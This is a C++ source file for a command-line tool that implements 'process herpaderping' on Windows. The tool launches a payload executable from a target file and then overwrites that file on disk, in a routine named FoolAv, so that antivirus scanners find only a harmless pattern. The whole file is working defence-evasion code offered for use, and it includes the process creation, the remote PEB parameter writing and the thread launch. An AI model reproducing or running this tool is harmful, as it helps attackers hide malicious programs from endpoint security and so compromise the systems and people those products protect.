// Author:  Nikj
// File:    Herpaderping.cpp

#include "pch.hpp"
#include "herpaderping.hpp"


VOID HERPADERPING::Start(_In_ std::wstring pPayloadFile, _In_ std::wstring pTargetFile) 
{
    HRESULT hResult = S_OK;

    std::cout << "\nAuthor: Nikj" << std::endl;
    std::cout << "Starting Herpaderping ..." << std::endl;

    std::wcout << "Press Enter to continue";
    std::wstring input;
    std::getline(std::wcin, input);
    std::wcout << input;

    hResult = this->ReadPayload(pPayloadFile);

    if (hResult != S_OK)
    {
        return;
    }

    hResult = this->CreateTarget(pTargetFile);

    if (hResult != S_OK)
    {
        return;
    }

    hResult = this->WritePayloadToTarget(pPayloadFile, pTargetFile);

    if (hResult != S_OK)
    {
        return;
    }

    hResult = this->FoolAv();

    if (hResult != S_OK)
    {
        return;
    }

    hResult = this->CreatePayloadThreadFromTarget(pTargetFile);

    if (hResult != S_OK)
    {
        return;
    }
    
}
 
HRESULT HERPADERPING::ReadPayload(_In_ std::wstring PayloadFile) 
{
    HRESULT hResult = S_OK;

    this->hProcessPayload.reset(CreateFileW(PayloadFile.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    ));

    if (!this->hProcessPayload.is_valid())
    {
        std::cerr << "[!] - Failed to open the payload file" << std::endl;
        hResult = E_FAIL;
    }

    return hResult;
    
}

HRESULT HERPADERPING::CreateTarget(_In_ std::wstring TargetFile) 
{
    HRESULT hResult = S_OK;

    this->hProcessTarget.reset(CreateFileW(TargetFile.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    ));

    if (!this->hProcessTarget.is_valid())
    {
        std::cerr << "[!] Failed to create the target file" << std::endl;
        hResult = E_FAIL;
    }

    return hResult;

}

HRESULT HERPADERPING::WritePayloadToTarget(_In_ std::wstring PayloadFile, _In_ std::wstring TargetFile)
{
    HRESULT hResult = S_OK;
    wil::unique_handle hSection;

    hResult = Utilitaire::CopyFileByHandle(this->hProcessPayload.get(), this->hProcessTarget.get());

    if (FAILED(hResult))
    {
        return hResult;
    }

    std::wcout << "[+] Copy " << PayloadFile << " to " << TargetFile << std::endl;

    // Free the payload process handle
    this->hProcessPayload.reset();

    // Create Sections and the process of the target
    auto status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        nullptr,
        nullptr,
        PAGE_READONLY,
        SEC_IMAGE,
        this->hProcessTarget.get()
    );

    status = NtCreateProcessEx(&this->hProcess,
        PROCESS_ALL_ACCESS,
        nullptr,
        NtCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        hSection.get(),
        nullptr,
        nullptr,
        0
    ); //Create a process with the section created above

    if (!NT_SUCCESS(status))
    {
        std::cerr << "[!] Unable to create process";
        hResult = E_FAIL;
        return hResult;
    }

    std::cout << "[+] Created process object, PID: " << GetProcessId(hProcess.get()) << std::endl;

    // Free the handle section, we don't need anymore
    hSection.reset();

    // Get the RVA for the CreateThread
    hResult = Utilitaire::GetImageEntryPointRva(hProcessTarget.get(), this->imageEntryPointRva);

    if (FAILED(hResult))
    {
        std::cerr << "[!] Failed to get the RVA of the target process" << std::endl;
        return hResult;
    }

    std::cout << "[+] Located target image entry RVA 0x" << imageEntryPointRva << std::endl;

    return hResult;

}
        
HRESULT HERPADERPING::FoolAv()
{
    HRESULT hResult = S_OK;
    std::array<uint8_t, 22> Pattern{ '\x68', '\x65', '\x72', '\x70', '\x61', '\x64',
	    '\x65', '\x72', '\x70', '\x69','\x6e', '\x67', '\x20', '\x69', '\x73', '\x20', '\x63', '\x6f',
	    '\x6f', '\x6f', '\x6f', '\x6c'
    }; // herpaderping is cool

    __try {

        // We overwrite the contents of the target file on disk to fool AV
        std::cout << "[+] Overwriting target with random pattern" << std::endl;
        
        hResult = Utilitaire::OverwriteFileContentsWithPattern(
            this->hProcessTarget.get(),
            Pattern,
            FALSE//true // Flush File
        );

        if (FAILED(hResult))
        {
            std::cerr << "[!] Failed to write pattern over file" << std::endl;
            hResult = E_FAIL;
            __leave;
        }

    }
    __finally {

        return hResult;

    }

}
        
HRESULT HERPADERPING::CreatePayloadThreadFromTarget(_In_ std::wstring TargetFile)
{
    HRESULT hResult = S_OK;
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    PEB peb = { 0 };
    VOID* remoteEntryPoint = NULL;
    wil::unique_handle threadHandle;
    DWORD dwtargetExitCode = 0;

    // We prepare the Target Process Thread to be executed
    std::cout << "[+] Preparing target for execution" << std::endl;

    auto status = NtQueryInformationProcess(this->hProcess.get(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        nullptr
    );
    if (!NT_SUCCESS(status))
    {
        std::cerr << "[!] Failed to query process information" << std::endl;
        hResult = E_FAIL;
        return hResult;
    }

    if (!ReadProcessMemory(hProcess.get(),
        pbi.PebBaseAddress,
        &peb,
        sizeof(peb),
        nullptr))
    {
        std::cerr << "[!] Failed to read remote process PEB" << std::endl;
        hResult = E_FAIL;
        return hResult;
    }

    std::cout << "[+] Writing process parameters, remote PEB ProcessParameters " << Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)) << std::endl;

    hResult = Utilitaire::WriteRemoteProcessParameters(
        hProcess.get(),
        TargetFile,
        std::nullopt,
        std::nullopt,
        (L"\"" + TargetFile + L"\""),
        NtCurrentPeb()->ProcessParameters->Environment,
        TargetFile,
        L"WinSta0\\Default",
        std::nullopt,
        std::nullopt
    );

    if (FAILED(hResult))
    {
        std::cerr << "[!] Failed to WriteRemoteProcessParameters" << std::endl;
        return hResult;
    }

    hProcessTarget.reset();

    remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);

    // We execute the tread 
        
    status = NtCreateThreadEx(&threadHandle,
        THREAD_ALL_ACCESS,
        nullptr,
        hProcess.get(),
        remoteEntryPoint,
        nullptr,
        0,
        0,
        0,
        0,
        nullptr
    );

    if (!NT_SUCCESS(status))
    {
        threadHandle.release();
        std::cerr << "[!] Failed to create remote thread" << std::endl;
        hResult = E_FAIL;
        return hResult;
    }

    std::cout << "[+] Created thread, TID:" << GetThreadId(threadHandle.get()) << std::endl;

    // Process target spawned, we wait for the exit to leave the program
    std::cout << "[+] Waiting for herpaderped process to exit" << std::endl;

    WaitForSingleObject(hProcess.get(), INFINITE);

    GetExitCodeProcess(hProcess.get(), &dwtargetExitCode);

    std::cout << "[+] Herpaderped process exited with code 0x" << dwtargetExitCode << std::endl;

    return hResult;
    
};

int wmain(int argc, wchar_t *argv[])
{
    if (argc < 3)
    {
        std::cerr << "Invalid number of parameters" << std::endl;
        std::wcerr << "Usage: " << argv[0] << " PayloadFile TargetFile" << std::endl;
    }
    else {
        std::wstring pPayloadFile = argv[1];
        std::wstring pTargetFile = argv[2];

        HERPADERPING herpaderping;
        herpaderping.Start(pPayloadFile, pTargetFile);
    }

    return 0;

}